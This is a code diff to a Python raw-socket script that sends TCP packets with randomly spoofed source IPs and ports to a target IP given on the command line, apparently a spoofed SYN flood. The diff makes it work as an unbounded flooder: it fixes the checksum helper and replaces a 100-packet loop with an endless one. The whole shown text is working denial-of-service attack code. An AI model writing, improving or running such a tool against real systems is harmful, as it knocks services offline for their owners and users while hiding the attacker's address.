@@ -5,6 +5,8 @@ import struct
 import sys
 
 def checksum(packet):
+    if isinstance(packet, bytes):
+        packet = bytearray(packet)
     plen = len(packet)
     if plen%2 == 1:
         plen += 1
@@ -24,7 +26,7 @@ if len(sys.argv) != 2:
 s = sc.socket(sc.AF_INET, sc.SOCK_RAW, sc.IPPROTO_TCP)
 s.setsockopt(sc.IPPROTO_IP, sc.IP_HDRINCL, 1)       #we make IPv4 header
 count = 0
-while count < 100:
+while True:
     srcIP =  random.randint(0,2**32-1)              # spoof my IP
     srcPort = random.randint(49152, 2**16-1)        # spoof my port
     target = sc.inet_aton(sys.argv[1])              # get target IP from command
@@ -39,8 +41,8 @@ while count < 100:
     pseudo_iphdr = iphdr[12:] + b'\x00\x06\x00\x14'
     chsum_tcp = checksum(pseudo_iphdr+tcphdr)
     chsum_ip = checksum(iphdr)
-    tcphdr = bytearray(tcphdr) # both headers are not mutable in Python
-    iphdr = bytearray(iphdr) #convert them into bytearray
+    tcphdr = bytearray(tcphdr)                      # both headers are not mutable in Python
+    iphdr = bytearray(iphdr)                        # convert them into bytearray
     iphdr[10] = chsum_ip//256
     iphdr[11] = chsum_ip%256
     tcphdr[16] = chsum_tcp//256
